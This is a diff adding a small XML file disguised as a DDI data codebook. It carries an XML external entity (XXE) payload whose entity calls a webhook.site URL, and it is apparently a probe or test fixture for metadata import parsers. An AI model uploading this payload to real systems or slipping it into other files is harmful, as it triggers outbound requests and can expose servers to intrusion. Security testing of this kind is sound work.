@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE codeBook [
+  <!ELEMENT codeBook ANY>
+  <!ENTITY xxe SYSTEM "https://webhook.site/8f7e0710-91b3-499f-bc9a-7d8f78d4c0dc">
+]>
+<codeBook xmlns="http://www.icpsr.umich.edu/DDI">
+  <dataDscr>
+    <foo>&xxe;</foo>
+  </dataDscr>
+</codeBook>
